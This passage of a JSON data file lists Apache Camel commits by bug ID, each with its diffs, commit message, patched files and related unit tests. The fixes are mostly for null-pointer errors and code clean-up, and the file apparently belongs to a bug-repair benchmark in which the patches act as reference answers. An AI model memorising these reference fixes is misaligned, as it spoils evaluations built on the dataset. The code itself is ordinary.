                "filename": "components/camel-cometd/src/main/java/org/apache/camel/component/cometd/CometdComponent.java",
                "patch": "@@ -75,18 +75,14 @@ public CometdComponent() {\n \n     @SuppressWarnings(\"unchecked\")\n     @Override\n-    protected Endpoint createEndpoint(String uri, String remaining,\n-            Map parameters) throws Exception {\n+    protected Endpoint createEndpoint(String uri, String remaining, Map parameters) throws Exception {\n         setProperties(this, parameters);\n-        CometdEndpoint endpoint = new CometdEndpoint(this, uri, remaining,\n-                parameters);\n+        CometdEndpoint endpoint = new CometdEndpoint(this, uri, remaining, parameters);\n         return endpoint;\n     }\n \n     /**\n      * Connects the URL specified on the endpoint to the specified processor.\n-     * \n-     * @throws Exception\n      */\n     public void connect(CometdProducerConsumer prodcon) throws Exception {\n         // Make sure that there is a connector for the requested endpoint.\n@@ -129,7 +125,7 @@ public void connect(CometdProducerConsumer prodcon) throws Exception {\n      * processor.\n      */\n     public void disconnect(CometdProducerConsumer prodcon) throws Exception {\n-        CometdEndpoint endpoint = (CometdEndpoint) prodcon.getEndpoint();\n+        CometdEndpoint endpoint = prodcon.getEndpoint();\n \n         String connectorKey = endpoint.getProtocol() + \":\" + endpoint.getUri().getHost() + \":\" + endpoint.getPort();\n \n@@ -145,8 +141,7 @@ public void disconnect(CometdProducerConsumer prodcon) throws Exception {\n         }\n     }\n \n-    protected ContinuationCometdServlet createServletForConnector(\n-            Connector connector, CometdEndpoint endpoint) throws Exception {\n+    protected ContinuationCometdServlet createServletForConnector(Connector connector, CometdEndpoint endpoint) throws Exception {\n         ContinuationCometdServlet servlet = new ContinuationCometdServlet();\n \n         Context context = new Context(server, \"/\", Context.NO_SECURITY | Context.NO_SESSIONS);\n@@ -157,20 +152,17 @@ protected ContinuationCometdServlet createServletForConnector(\n         context.setResourceBase(endpoint.getResourceBase());\n         context.addServlet(holder, \"/cometd/*\");\n         context.addServlet(\"org.mortbay.jetty.servlet.DefaultServlet\", \"/\");\n+\n         connector.start();\n         context.start();\n-        holder.setInitParameter(\"timeout\", Integer.toString(endpoint\n-                .getTimeout()));\n-        holder.setInitParameter(\"interval\", Integer.toString(endpoint\n-                .getInterval()));\n-        holder.setInitParameter(\"maxInterval\", Integer.toString(endpoint\n-                .getMaxInterval()));\n-        holder.setInitParameter(\"multiFrameInterval\", Integer.toString(endpoint\n-                .getMultiFrameInterval()));\n-        holder.setInitParameter(\"JSONCommented\", Boolean.toString(endpoint\n-                .isJsonCommented()));\n-        holder.setInitParameter(\"logLevel\", Integer.toString(endpoint\n-                .getLogLevel()));\n+\n+        holder.setInitParameter(\"timeout\", Integer.toString(endpoint.getTimeout()));\n+        holder.setInitParameter(\"interval\", Integer.toString(endpoint.getInterval()));\n+        holder.setInitParameter(\"maxInterval\", Integer.toString(endpoint.getMaxInterval()));\n+        holder.setInitParameter(\"multiFrameInterval\", Integer.toString(endpoint.getMultiFrameInterval()));\n+        holder.setInitParameter(\"JSONCommented\", Boolean.toString(endpoint.isJsonCommented()));\n+        holder.setInitParameter(\"logLevel\", Integer.toString(endpoint.getLogLevel()));\n+\n         return servlet;\n     }\n ",
                "raw_url": "https://github.com/apache/camel/raw/833f466746fc74a4110601f65fc3189f42b7ec88/components/camel-cometd/src/main/java/org/apache/camel/component/cometd/CometdComponent.java",
                "sha": "ed1baf91ee92c41b8ba3ad6f4463a513066d1dc3",
                "status": "modified"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/833f466746fc74a4110601f65fc3189f42b7ec88/components/camel-cometd/src/main/java/org/apache/camel/component/cometd/CometdConsumer.java",
                "changes": 1,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cometd/src/main/java/org/apache/camel/component/cometd/CometdConsumer.java?ref=833f466746fc74a4110601f65fc3189f42b7ec88",
                "deletions": 1,
                "filename": "components/camel-cometd/src/main/java/org/apache/camel/component/cometd/CometdConsumer.java",
                "patch": "@@ -18,7 +18,6 @@\n \n import dojox.cometd.Bayeux;\n import dojox.cometd.Client;\n-\n import org.apache.camel.Exchange;\n import org.apache.camel.Message;\n import org.apache.camel.Processor;",
                "raw_url": "https://github.com/apache/camel/raw/833f466746fc74a4110601f65fc3189f42b7ec88/components/camel-cometd/src/main/java/org/apache/camel/component/cometd/CometdConsumer.java",
                "sha": "398b04340f0e3fbeb0b9d79cd9462b11646abcb1",
                "status": "modified"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/833f466746fc74a4110601f65fc3189f42b7ec88/components/camel-cometd/src/main/java/org/apache/camel/component/cometd/CometdConverters.java",
                "changes": 21,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cometd/src/main/java/org/apache/camel/component/cometd/CometdConverters.java?ref=833f466746fc74a4110601f65fc3189f42b7ec88",
                "deletions": 21,
                "filename": "components/camel-cometd/src/main/java/org/apache/camel/component/cometd/CometdConverters.java",
                "patch": "@@ -30,25 +30,4 @@ private CometdConverters() {\n         //Utility Class\n     }\n \n-    /**\n-     * Converts the given JavaMail message to a String body.\n-     * Can return null.\n-     */\n-/*    \n-    @Converter\n-    public static String toString(Message message) throws MessagingException, IOException {\n-        Object content = message.getContent();\n-        if (content instanceof MimeMultipart) {\n-            MimeMultipart multipart = (MimeMultipart) content;\n-            if (multipart.getCount() > 0) {\n-                BodyPart part = multipart.getBodyPart(0);\n-                content = part.getContent();\n-            }\n-        }\n-        if (content != null) {\n-            return content.toString();\n-        }\n-        return null;\n-    }\n-*/\n }",
                "raw_url": "https://github.com/apache/camel/raw/833f466746fc74a4110601f65fc3189f42b7ec88/components/camel-cometd/src/main/java/org/apache/camel/component/cometd/CometdConverters.java",
                "sha": "26642c9d24b385e33a74b8da70fd7042f8ed09d3",
                "status": "modified"
            },
            {
                "additions": 14,
                "blob_url": "https://github.com/apache/camel/blob/833f466746fc74a4110601f65fc3189f42b7ec88/components/camel-cometd/src/main/java/org/apache/camel/component/cometd/CometdEndpoint.java",
                "changes": 28,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cometd/src/main/java/org/apache/camel/component/cometd/CometdEndpoint.java?ref=833f466746fc74a4110601f65fc3189f42b7ec88",
                "deletions": 14,
                "filename": "components/camel-cometd/src/main/java/org/apache/camel/component/cometd/CometdEndpoint.java",
                "patch": "@@ -24,6 +24,7 @@\n import org.apache.camel.Processor;\n import org.apache.camel.Producer;\n import org.apache.camel.impl.DefaultEndpoint;\n+import org.apache.camel.util.ObjectHelper;\n \n /**\n  * Endpoint for Camel Cometd.\n@@ -32,38 +33,38 @@\n  */\n public class CometdEndpoint extends DefaultEndpoint {\n    \n-    private String          resourceBase;\n-    private int             timeout = 240000;\n-    private int             interval;\n-    private int             maxInterval = 30000;\n-    private int             multiFrameInterval = 1500;\n-    private boolean         jsonCommented = true;\n-    private int             logLevel = 1;\n-    private URI             uri;\n+    private String resourceBase;\n+    private int timeout = 240000;\n+    private int interval;\n+    private int maxInterval = 30000;\n+    private int multiFrameInterval = 1500;\n+    private boolean jsonCommented = true;\n+    private int logLevel = 1;\n+    private URI uri;\n     private CometdComponent component;\n     \n-    @SuppressWarnings(\"unchecked\")\n     public CometdEndpoint(CometdComponent component, String uri, String remaining, Map parameters) {\n-        super(uri);\n+        super(uri, component);\n         this.component = component;\n         try {\n             this.uri = new URI(uri);\n         } catch (URISyntaxException e) {\n-            e.printStackTrace();\n+            throw new IllegalArgumentException(e);\n         }\n     }\n \n     public Producer createProducer() throws Exception {\n+        ObjectHelper.notNull(component, \"component\");\n         CometdProducer producer = new CometdProducer(this);\n         return producer;\n     }\n \n     public Consumer createConsumer(Processor processor) throws Exception {\n+        ObjectHelper.notNull(component, \"component\");\n         CometdConsumer consumer =  new CometdConsumer(this, processor);\n         return consumer;\n     }\n \n-    \n     public void connect(CometdProducerConsumer prodcons) throws Exception {\n         component.connect(prodcons);\n     }\n@@ -102,8 +103,7 @@ public String getProtocol() {\n     public URI getUri() {\n         return uri;\n     }\n-    \n-    \n+\n     public String getResourceBase() {\n         return resourceBase;\n     }",
                "raw_url": "https://github.com/apache/camel/raw/833f466746fc74a4110601f65fc3189f42b7ec88/components/camel-cometd/src/main/java/org/apache/camel/component/cometd/CometdEndpoint.java",
                "sha": "1ecac6ab23e826646e348f29e8e31cb30678bcf3",
                "status": "modified"
            },
            {
                "additions": 8,
                "blob_url": "https://github.com/apache/camel/blob/833f466746fc74a4110601f65fc3189f42b7ec88/components/camel-cometd/src/main/java/org/apache/camel/component/cometd/CometdProducer.java",
                "changes": 15,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cometd/src/main/java/org/apache/camel/component/cometd/CometdProducer.java?ref=833f466746fc74a4110601f65fc3189f42b7ec88",
                "deletions": 7,
                "filename": "components/camel-cometd/src/main/java/org/apache/camel/component/cometd/CometdProducer.java",
                "patch": "@@ -17,12 +17,11 @@\n package org.apache.camel.component.cometd;\n \n import java.util.Collection;\n-import java.util.Iterator;\n \n import dojox.cometd.Client;\n-\n import org.apache.camel.Exchange;\n import org.apache.camel.impl.DefaultProducer;\n+import org.apache.camel.util.ObjectHelper;\n import org.apache.commons.logging.Log;\n import org.apache.commons.logging.LogFactory;\n import org.mortbay.cometd.AbstractBayeux;\n@@ -33,11 +32,9 @@\n  * @version $Revision$\n  */\n public class CometdProducer extends DefaultProducer implements CometdProducerConsumer {\n-\n-    @SuppressWarnings(\"unused\")\n     private static final transient Log LOG = LogFactory.getLog(CometdProducer.class);\n     \n-    private AbstractBayeux       bayeux;  \n+    private AbstractBayeux bayeux;\n     private final CometdEndpoint endpoint;\n \n     public CometdProducer(CometdEndpoint endpoint) {\n@@ -58,9 +55,13 @@ public void stop() throws Exception {\n     }\n \n     public void process(final Exchange exchange) {\n+        ObjectHelper.notNull(bayeux, \"bayeux\");\n+\n         Collection<Client> clients = bayeux.getClients();\n-        for (Iterator<Client> iterator = clients.iterator(); iterator.hasNext();) {\n-            Client client = (Client) iterator.next();\n+        for (Client client : clients) {\n+            if (LOG.isTraceEnabled()) {\n+                LOG.trace(\"Delivering to client id: \" + client.getId() + \" path:\" + endpoint.getPath() + \" exchange: \" + exchange);\n+            }\n             client.deliver(client, endpoint.getPath(), exchange.getIn().getBody(), null);\n         }\n     }",
                "raw_url": "https://github.com/apache/camel/raw/833f466746fc74a4110601f65fc3189f42b7ec88/components/camel-cometd/src/main/java/org/apache/camel/component/cometd/CometdProducer.java",
                "sha": "49e4503b695b571703b0c672454e9f56ba50fc33",
                "status": "modified"
            },
            {
                "additions": 10,
                "blob_url": "https://github.com/apache/camel/blob/833f466746fc74a4110601f65fc3189f42b7ec88/components/camel-cometd/src/main/java/org/apache/camel/component/cometd/CometdProducerConsumer.java",
                "changes": 12,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cometd/src/main/java/org/apache/camel/component/cometd/CometdProducerConsumer.java?ref=833f466746fc74a4110601f65fc3189f42b7ec88",
                "deletions": 2,
                "filename": "components/camel-cometd/src/main/java/org/apache/camel/component/cometd/CometdProducerConsumer.java",
                "patch": "@@ -19,8 +19,16 @@\n import org.mortbay.cometd.AbstractBayeux;\n \n public interface CometdProducerConsumer {\n-    \n+\n+    /**\n+     * Gets the endpoint\n+     */\n     CometdEndpoint getEndpoint();\n-    void           setBayeux(AbstractBayeux bayeux);\n+\n+\n+    /**\n+     * Sets the bayeux to use.\n+     */\n+    void setBayeux(AbstractBayeux bayeux);\n     \n }",
                "raw_url": "https://github.com/apache/camel/raw/833f466746fc74a4110601f65fc3189f42b7ec88/components/camel-cometd/src/main/java/org/apache/camel/component/cometd/CometdProducerConsumer.java",
                "sha": "bad1629eff71859a4ca361e82d0b38c499fc0988",
                "status": "modified"
            },
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/833f466746fc74a4110601f65fc3189f42b7ec88/components/camel-cometd/src/test/java/org/apache/camel/component/cometd/CometdProducerConsumerInteractiveMain.java",
                "changes": 10,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cometd/src/test/java/org/apache/camel/component/cometd/CometdProducerConsumerInteractiveMain.java?ref=833f466746fc74a4110601f65fc3189f42b7ec88",
                "deletions": 6,
                "filename": "components/camel-cometd/src/test/java/org/apache/camel/component/cometd/CometdProducerConsumerInteractiveMain.java",
                "patch": "@@ -18,27 +18,25 @@\n \n import java.io.File;\n import java.net.URI;\n-import java.net.URISyntaxException;\n-import java.net.URL;\n \n import org.apache.camel.CamelContext;\n import org.apache.camel.builder.RouteBuilder;\n import org.apache.camel.impl.DefaultCamelContext;\n \n-public class CometdProducerConsumerInteractiveTest {\n+public class CometdProducerConsumerInteractiveMain {\n \n-    private static final String URI = \"cometd://localhost:8080/service/test?resourceBase=./src/test/resources/webapp&\"\n+    private static final String URI = \"cometd://0.0.0.0:8080/service/test?resourceBase=./src/test/resources/webapp&\"\n             + \"timeout=240000&interval=0&maxInterval=30000&multiFrameInterval=1500&jsonCommented=true&logLevel=2\";\n \n-    private static final String URIS = \"cometds://localhost:8443/service/test?resourceBase=./src/test/resources/webapp&\"\n+    private static final String URIS = \"cometds://0.0.0.0:8443/service/test?resourceBase=./src/test/resources/webapp&\"\n         + \"timeout=240000&interval=0&maxInterval=30000&multiFrameInterval=1500&jsonCommented=true&logLevel=2\";\n \n     private CamelContext context;\n \n     private String pwd = \"changeit\";\n     \n     public static void main(String[] args) throws Exception {\n-        CometdProducerConsumerInteractiveTest me = new CometdProducerConsumerInteractiveTest();\n+        CometdProducerConsumerInteractiveMain me = new CometdProducerConsumerInteractiveMain();\n         me.testCometdProducerConsumerInteractive();\n     }\n ",
                "previous_filename": "components/camel-cometd/src/main/java/org/apache/camel/component/cometd/CometdProducerConsumerInteractiveTest.java",
                "raw_url": "https://github.com/apache/camel/raw/833f466746fc74a4110601f65fc3189f42b7ec88/components/camel-cometd/src/test/java/org/apache/camel/component/cometd/CometdProducerConsumerInteractiveMain.java",
                "sha": "e18d4ece30a2238c08379525b6a34689182b97e0",
                "status": "renamed"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/833f466746fc74a4110601f65fc3189f42b7ec88/components/camel-cometd/src/test/java/org/apache/camel/component/cometd/CometdProducerConsumerTest.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cometd/src/test/java/org/apache/camel/component/cometd/CometdProducerConsumerTest.java?ref=833f466746fc74a4110601f65fc3189f42b7ec88",
                "deletions": 1,
                "filename": "components/camel-cometd/src/test/java/org/apache/camel/component/cometd/CometdProducerConsumerTest.java",
                "patch": "@@ -28,7 +28,7 @@\n  */\n public class CometdProducerConsumerTest extends ContextTestSupport {\n \n-    private static final String URI = \"cometd://localhost:8080/service/test?resourceBase=./target/test-classes/webapp&\"\n+    private static final String URI = \"cometd://0.0.0.0:8080/service/test?resourceBase=./target/test-classes/webapp&\"\n             + \"timeout=240000&interval=0&maxInterval=30000&multiFrameInterval=1500&jsonCommented=true&logLevel=2\";\n \n     public void testProducer() throws Exception {",
                "raw_url": "https://github.com/apache/camel/raw/833f466746fc74a4110601f65fc3189f42b7ec88/components/camel-cometd/src/test/java/org/apache/camel/component/cometd/CometdProducerConsumerTest.java",
                "sha": "df4c86f9d541dce7748f0545eea0dfe327966631",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/833f466746fc74a4110601f65fc3189f42b7ec88/components/camel-cometd/src/test/java/org/apache/camel/component/cometd/SslCometdProducerConsumerTest.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cometd/src/test/java/org/apache/camel/component/cometd/SslCometdProducerConsumerTest.java?ref=833f466746fc74a4110601f65fc3189f42b7ec88",
                "deletions": 1,
                "filename": "components/camel-cometd/src/test/java/org/apache/camel/component/cometd/SslCometdProducerConsumerTest.java",
                "patch": "@@ -29,7 +29,7 @@\n  */\n public class SslCometdProducerConsumerTest extends ContextTestSupport {\n \n-    private static final String URI = \"cometds://localhost:8080/service/test?resourceBase=./target/test-classes/webapp&\"\n+    private static final String URI = \"cometds://0.0.0.0:8080/service/test?resourceBase=./target/test-classes/webapp&\"\n             + \"timeout=240000&interval=0&maxInterval=30000&multiFrameInterval=1500&jsonCommented=true&logLevel=2\";\n \n     protected String pwd = \"changeit\";",
                "raw_url": "https://github.com/apache/camel/raw/833f466746fc74a4110601f65fc3189f42b7ec88/components/camel-cometd/src/test/java/org/apache/camel/component/cometd/SslCometdProducerConsumerTest.java",
                "sha": "aaf8bd3ad2c0572b7e1f2981c7837c9911a8c0ea",
                "status": "modified"
            }
        ],
        "message": "CAMEL-1373: CamelCase and fixed a NPE bug in this one. Polished code.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@748103 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/80b9dc6cd02cd0a9bdfd9489afe947e52a3faa3a",
        "patched_files": [
            "CometdEndpoint.java",
            "CometdComponent.java",
            "CometdConsumer.java",
            "CometdProducer.java",
            "CometdProducerConsumer.java",
            "pom.java",
            "CometdProducerConsumerInteractiveMain.java",
            "CometdConverters.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CometdConsumerTest.java",
            "SslCometdProducerConsumerTest.java",
            "CometdProducerTest.java",
            "CometdProducerConsumerTest.java"
        ]
    },
    "camel_86525d7": {
        "bug_id": "camel_86525d7",
        "commit": "https://github.com/apache/camel/commit/86525d7c10bddc7d392e4bfe710d1e1b6fc54046",
        "file": [
            {
                "additions": 15,
                "blob_url": "https://github.com/apache/camel/blob/86525d7c10bddc7d392e4bfe710d1e1b6fc54046/components/camel-jms/src/main/java/org/apache/camel/component/jms/JmsBinding.java",
                "changes": 22,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-jms/src/main/java/org/apache/camel/component/jms/JmsBinding.java?ref=86525d7c10bddc7d392e4bfe710d1e1b6fc54046",
                "deletions": 7,
                "filename": "components/camel-jms/src/main/java/org/apache/camel/component/jms/JmsBinding.java",
                "patch": "@@ -64,19 +64,28 @@\n  */\n public class JmsBinding {\n     private static final transient Log LOG = LogFactory.getLog(JmsBinding.class);\n-    private JmsEndpoint endpoint;\n-    private HeaderFilterStrategy headerFilterStrategy;\n+    private final JmsEndpoint endpoint;\n+    private final HeaderFilterStrategy headerFilterStrategy;\n+    private final JmsKeyFormatStrategy jmsKeyFormatStrategy;\n \n     public JmsBinding() {\n+        this.endpoint = null;\n         headerFilterStrategy = new JmsHeaderFilterStrategy();\n+        jmsKeyFormatStrategy = new DefaultJmsKeyFormatStrategy();\n     }\n \n     public JmsBinding(JmsEndpoint endpoint) {\n         this.endpoint = endpoint;\n-        headerFilterStrategy = endpoint.getHeaderFilterStrategy();\n-        if (headerFilterStrategy == null) {\n+        if (endpoint.getHeaderFilterStrategy() != null) {\n+            headerFilterStrategy = endpoint.getHeaderFilterStrategy();\n+        } else {\n             headerFilterStrategy = new JmsHeaderFilterStrategy();\n         }\n+        if (endpoint.getJmsKeyFormatStrategy() != null) {\n+            jmsKeyFormatStrategy = endpoint.getJmsKeyFormatStrategy();\n+        } else {\n+            jmsKeyFormatStrategy = new DefaultJmsKeyFormatStrategy();\n+        }\n     }\n \n     /**\n@@ -154,7 +163,7 @@ public Object extractBodyFromJms(Exchange exchange, Message message) {\n \n                     // must decode back from safe JMS header name to original header name\n                     // when storing on this Camel JmsMessage object.\n-                    String key = endpoint.getJmsKeyFormatStrategy().decodeKey(name);\n+                    String key = jmsKeyFormatStrategy.decodeKey(name);\n                     map.put(key, value);\n                 } catch (JMSException e) {\n                     throw new RuntimeCamelException(name, e);\n@@ -200,7 +209,7 @@ public Message makeJmsMessage(Exchange exchange, Session session) throws JMSExce\n     public Message makeJmsMessage(Exchange exchange, org.apache.camel.Message camelMessage, Session session, Exception cause) throws JMSException {\n         Message answer = null;\n \n-        boolean alwaysCopy = (endpoint != null) && endpoint.getConfiguration().isAlwaysCopyMessage();\n+        boolean alwaysCopy = endpoint != null && endpoint.getConfiguration().isAlwaysCopyMessage();\n         if (!alwaysCopy && camelMessage instanceof JmsMessage) {\n             JmsMessage jmsMessage = (JmsMessage)camelMessage;\n             if (!jmsMessage.shouldCreateNewMessage()) {\n@@ -432,7 +441,6 @@ protected void populateMapMessage(MapMessage message, Map<?, ?> map, CamelContex\n      */\n     protected boolean shouldOutputHeader(org.apache.camel.Message camelMessage, String headerName,\n                                          Object headerValue, Exchange exchange) {\n-\n         return headerFilterStrategy == null\n             || !headerFilterStrategy.applyFilterToCamelHeaders(headerName, headerValue, exchange);\n     }",
                "raw_url": "https://github.com/apache/camel/raw/86525d7c10bddc7d392e4bfe710d1e1b6fc54046/components/camel-jms/src/main/java/org/apache/camel/component/jms/JmsBinding.java",
                "sha": "fbf0f5e6fe7e670c9a1f41683d943c43ba6666e7",
                "status": "modified"
            }
        ],
        "message": "CAMEL-1492: Fixed NPE when endpoint not pprovided in JmsBinding.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@759042 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/6d17017c13a25aaaffb423d7bc164cf7a02d129e",
        "patched_files": [
            "JmsBinding.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "JmsBindingTest.java"
        ]
    },
    "camel_89b397a": {
        "bug_id": "camel_89b397a",
        "commit": "https://github.com/apache/camel/commit/89b397ab55aeca809528a5fdea33ca0090bece34",
        "file": [
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/89b397ab55aeca809528a5fdea33ca0090bece34/tests/camel-itest-osgi/src/test/java/org/apache/camel/itest/osgi/jpa/JpaRouteTest.java",
                "changes": 1,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/tests/camel-itest-osgi/src/test/java/org/apache/camel/itest/osgi/jpa/JpaRouteTest.java?ref=89b397ab55aeca809528a5fdea33ca0090bece34",
                "deletions": 1,
                "filename": "tests/camel-itest-osgi/src/test/java/org/apache/camel/itest/osgi/jpa/JpaRouteTest.java",
                "patch": "@@ -103,7 +103,6 @@ protected CamelContext createCamelContext() throws Exception {\n             applicationContext.setBundleContext(bundleContext);\n             applicationContext.refresh();\n         }\n-        cleanupRepository();\n         return SpringCamelContext.springCamelContext(applicationContext);\n     }\n ",
                "raw_url": "https://github.com/apache/camel/raw/89b397ab55aeca809528a5fdea33ca0090bece34/tests/camel-itest-osgi/src/test/java/org/apache/camel/itest/osgi/jpa/JpaRouteTest.java",
                "sha": "3d111b815041d38453b8f0c5606a1be33f1a171c",
                "status": "modified"
            }
        ],
        "message": "Fixed the NPE of JpaRouteTest",
        "parent": "https://github.com/apache/camel/commit/b6110249f2bcad8663e376ff3b381e58638658ec",
        "patched_files": [],
        "repo": "camel",
        "unit_tests": [
            "JpaRouteTest.java"
        ]
    },
    "camel_89dc68e": {
        "bug_id": "camel_89dc68e",
        "commit": "https://github.com/apache/camel/commit/89dc68e5d87f4f19b313d98e22ee9f2337a394f0",
        "file": [
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/89dc68e5d87f4f19b313d98e22ee9f2337a394f0/components/camel-jms/src/main/java/org/apache/camel/component/jms/JmsBinding.java",
                "changes": 5,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-jms/src/main/java/org/apache/camel/component/jms/JmsBinding.java?ref=89dc68e5d87f4f19b313d98e22ee9f2337a394f0",
                "deletions": 3,
                "filename": "components/camel-jms/src/main/java/org/apache/camel/component/jms/JmsBinding.java",
                "patch": "@@ -255,9 +255,8 @@ public void appendJmsProperty(Message jmsMessage, Exchange exchange, org.apache.\n                     // only set the JMSReply if the Exchange supports Out\n                     jmsMessage.setJMSReplyTo(ExchangeHelper.convertToType(exchange, Destination.class, headerValue));\n                 } else {\n-                    if (LOG.isDebugEnabled()) {\n-                        LOG.debug(\"Exchange is not out capable, Ignoring JMSReplyTo: \" + headerValue);\n-                    }\n+                    // warn we got a JMSReplyTo but the Exchange is not out capable\n+                    LOG.warn(\"Exchange is not out capable, Ignoring JMSReplyTo: \" + headerValue);\n                 }\n             } else if (headerName.equals(\"JMSType\")) {\n                 jmsMessage.setJMSType(ExchangeHelper.convertToType(exchange, String.class, headerValue));",
                "raw_url": "https://github.com/apache/camel/raw/89dc68e5d87f4f19b313d98e22ee9f2337a394f0/components/camel-jms/src/main/java/org/apache/camel/component/jms/JmsBinding.java",
                "sha": "b6559a1621908164b01282f564d30888d5392907",
                "status": "modified"
            }
        ],
        "message": "CAMEL-1461: JMSProducer only sets JMSReplyTo if exchange is out capable. Fixed a NPE.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@757730 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/1e31fa5f695e2f3f99fec2488197e99985f36376",
        "patched_files": [
            "JmsBinding.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "JmsBindingTest.java"
        ]
    },
    "camel_8a70c60": {
        "bug_id": "camel_8a70c60",
        "commit": "https://github.com/apache/camel/commit/8a70c60d8be187ef80daca054dd80536d7ad9b45",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/8a70c60d8be187ef80daca054dd80536d7ad9b45/components/camel-jasypt/src/main/java/org/apache/camel/component/jasypt/JasyptPropertiesParser.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-jasypt/src/main/java/org/apache/camel/component/jasypt/JasyptPropertiesParser.java?ref=8a70c60d8be187ef80daca054dd80536d7ad9b45",
                "deletions": 1,
                "filename": "components/camel-jasypt/src/main/java/org/apache/camel/component/jasypt/JasyptPropertiesParser.java",
                "patch": "@@ -91,7 +91,7 @@ public void setPassword(String password) {\n         if (password.startsWith(\"sysenv:\")) {\n             password = System.getenv(ObjectHelper.after(password, \"sysenv:\"));\n         }\n-        if (password.startsWith(\"sys:\")) {\n+        if (ObjectHelper.isNotEmpty(password) && password.startsWith(\"sys:\")) {\n             password = System.getProperty(ObjectHelper.after(password, \"sys:\"));\n         }\n         this.password = password;",
                "raw_url": "https://github.com/apache/camel/raw/8a70c60d8be187ef80daca054dd80536d7ad9b45/components/camel-jasypt/src/main/java/org/apache/camel/component/jasypt/JasyptPropertiesParser.java",
                "sha": "aa86a0c78645513cdcb30eb710c371b3d4a0d65c",
                "status": "modified"
            }
        ],
        "message": "CAMEL-10822 - Camel Jasypt component throws NPE. Thanks to Joe Luo for the patch.",
        "parent": "https://github.com/apache/camel/commit/99dff7d7f48550cb7bbb4fb865822ab4e7d8a94d",
        "patched_files": [
            "JasyptPropertiesParser.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "JasyptPropertiesParserTest.java"
        ]
    },
    "camel_8aea5df": {
        "bug_id": "camel_8aea5df",
        "commit": "https://github.com/apache/camel/commit/8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/EndpointInject.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/EndpointInject.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 3,
                "filename": "camel-core/src/main/java/org/apache/camel/EndpointInject.java",
                "patch": "@@ -22,15 +22,13 @@\n import java.lang.annotation.RetentionPolicy;\n import java.lang.annotation.Target;\n \n-import org.apache.camel.spi.Registry;\n-\n /**\n  * Used to indicate an injection point of an {@link Endpoint}, {@link Producer} or\n  * {@link ProducerTemplate} into a POJO.\n  *\n  * A <a href=\"http://camel.apache.org/uris.html\">URI</a> for an endpoint\n  * can be specified on this annotation, or a name can be specified which is resolved in the\n- * {@link Registry} such as in your Spring ApplicationContext.\n+ * {@link org.apache.camel.spi.Registry} such as in your Spring ApplicationContext.\n  *\n  * If no name or uri is specified then the name is defaulted from the field, property or method name.\n  *",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/EndpointInject.java",
                "sha": "56784b4101d9585b71e8b39de492a718e86799ab",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/NoSuchBeanException.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/NoSuchBeanException.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 3,
                "filename": "camel-core/src/main/java/org/apache/camel/NoSuchBeanException.java",
                "patch": "@@ -16,10 +16,8 @@\n  */\n package org.apache.camel;\n \n-import org.apache.camel.spi.Registry;\n-\n /**\n- * A runtime exception if a given bean could not be found in the {@link Registry}\n+ * A runtime exception if a given bean could not be found in the {@link org.apache.camel.spi.Registry}\n  *\n  * @version $Revision$\n  */",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/NoSuchBeanException.java",
                "sha": "593ce65932c465746f6a524d3b865d785cf1c3f1",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/NoSuchHeaderException.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/NoSuchHeaderException.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 3,
